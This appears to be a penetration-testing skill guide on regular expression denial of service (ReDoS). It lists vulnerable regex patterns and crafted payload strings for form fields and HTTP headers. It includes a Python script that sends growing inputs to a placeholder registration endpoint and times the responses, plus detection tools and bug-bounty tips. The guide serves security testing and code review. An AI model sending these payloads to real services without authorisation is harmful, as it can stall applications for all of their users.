---
name: regex-dos
description: Regular expression denial of service (ReDoS) — detecting catastrophic backtracking in web application regex patterns
---

# Regular Expression DoS (ReDoS)

ReDoS exploits catastrophic backtracking in regular expressions — where certain input patterns cause exponential matching time. A single crafted string can lock a regex engine for seconds or minutes, effectively DoS-ing the application. ReDoS is particularly impactful in Node.js (single-threaded) and any synchronous regex usage in hot paths.

## How It Works

Vulnerable regex patterns with nested quantifiers and overlapping character classes cause exponential backtracking:

```python
# Vulnerable pattern:
import re
pattern = re.compile(r'^(a+)+$')  # Catastrophic!
# Test with: "aaaaaaaaaaaaaaaaaaaax"
# The regex tries every combination of how to split the 'a's → exponential

# Another example:
r'^(a|aa)+$'   # Catastrophic
r'^(\w+\s*)+$' # Catastrophic on: "aaaa aaaa aaaa aaaa aaaa aaaa!"
r'^([a-zA-Z]+)*$'  # Catastrophic
```

## Vulnerable Patterns

```regex
# Nested quantifiers:
(a+)+        → catastrophic
(a|a?)+      → catastrophic
(.*a){x}     → catastrophic for large x

# Alternation with overlap:
(a|aa)+
([a-z]|[a-z])+
(hello|hell)+

# Real-world examples:
# Email validation:
^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$

# URL validation:
^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$

# Passport/visa number:
^[a-zA-Z0-9<]{0,10}[a-zA-Z0-9 ]{0,10}$  # Depends on context

# Date parsing:
^\d{1,2}\/\d{1,2}\/\d{2,4}$  # Usually safe
(\d+\.)+\d+   # Version numbers: safe-ish but can be slow
```

## Attack Vectors

**Form inputs processed by regex validation**
```
# Email validation (target: email fields)
# Craft: aaaaaaaaaaaaaaaaaaaaaaaaa@
# Or: test@aaaaaaaaaaaaaaaaaaaaaa.

# Username validation
# Craft: aaaaaaaaaaaaaaaaaaa! (where ! doesn't match pattern)

# Phone number
# Password strength meter (heavy regex in real-time validation)

# Search boxes with regex-based filtering
# URL validation
```

**Header values**
```
User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Referer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/
Accept-Language: aaaa-aaaa-aaaa-aaaa-aaaa-aaaa-aaaa-aaaa!
```

**Node.js Specifics**

Node.js is single-threaded — one ReDoS attack blocks ALL concurrent requests:
```javascript
// Particularly vulnerable: Express middleware, Joi/Yup validation
// express-validator, input validation libraries
// Moment.js date parsing (historical vulnerabilities)
```

## Crafting ReDoS Payloads

**For `(a+)+` pattern:**
```
"aaaaaaaaaaaaaaaaaaaax"  # 20 a's followed by non-matching char
# Doubling: a, aa, aaaa, aaaaaaaa — find where time increases exponentially
```

**For `(\w+\s*)+` pattern:**
```
"aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa!"
```

**General methodology:**
1. Identify the regex pattern (source code, error messages, library docs)
2. Find the nested quantifier or overlapping alternation
3. Craft input matching the repetition group pattern + non-matching character at end
4. Measure response time with increasing input length

## Detection

```python
# Test with progressively longer inputs
import requests, time

payloads = [
    "a" * 10 + "!",
    "a" * 20 + "!",
    "a" * 30 + "!",
    "a" * 40 + "!",
]

for p in payloads:
    start = time.time()
    r = requests.post("https://target.com/register", data={"email": p})
    elapsed = time.time() - start
    print(f"len={len(p)}, time={elapsed:.2f}s")

# Exponential time increase = ReDoS confirmed
```

## Tools

```bash
# RXXR2 — static analysis for vulnerable regex
rxxr2 -f pattern.txt

# Regex101 — test regex performance interactively (web)
# regex101.com → enable debugger → count steps

# NodeJSScan — scans Node.js for ReDoS
nodesecurity check

# safe-regex npm package
safe-regex '(a+)+'  # Returns false if vulnerable

# vuln-regex-detector
python3 vuln-regex-detector.py "^(a+)+$"
```

## Testing Methodology

1. **Identify input validation** — Find all form fields with client-side or server-side validation
2. **Source code review** — Look for regex patterns with nested quantifiers
3. **Time-based testing** — Send inputs of increasing length, measure response time
4. **Focus on Node.js** — Highest impact due to single-threaded event loop
5. **Test real-time validation** — Password meters, email validators, search boxes
6. **Check dependencies** — `npm audit` / `pip audit` for regex-vulnerable libraries

## Validation

1. Show response times with different input lengths demonstrating exponential growth
2. Calculate the "evil input" length that causes >2 second delay
3. Show that legitimate inputs respond normally (< 100ms)
4. Identify the specific regex and vulnerable pattern structure

## False Positives

- Linear or logarithmic time increase (not catastrophic)
- Timeout protection preventing long-running regex
- Server-side caching returning pre-computed results
- Input length limits preventing long payloads

## Impact

- DoS of Node.js applications (blocks event loop, affects all users)
- Application-level DoS requiring only HTTP requests (no bandwidth attack)
- In microservices: one vulnerable service can cascade
- Rate limiting may not prevent ReDoS (1 request = DoS)

## Pro Tips

1. ReDoS is often accepted as P3/P4 in bug bounty — focus on Node.js for higher impact
2. Email validation regex is the most common ReDoS vector in real apps
3. Check open source libraries used for validation — npm/PyPI have many historical ReDoS CVEs
4. `safe-regex` and `vuln-regex-detector` give you instant answers for code review
5. For Cloudflare/CDN-protected apps, ReDoS may not be exploitable (CDN drops long-running requests)
6. Combine with other findings: if you found a ReDoS, also note the lack of rate limiting

## Summary

ReDoS turns regex validation into a DoS vector. Find nested quantifiers and overlapping alternations, craft inputs with matching + non-matching characters, and measure exponential time growth. Node.js single-threaded event loop makes it the highest-impact target for ReDoS in web applications.
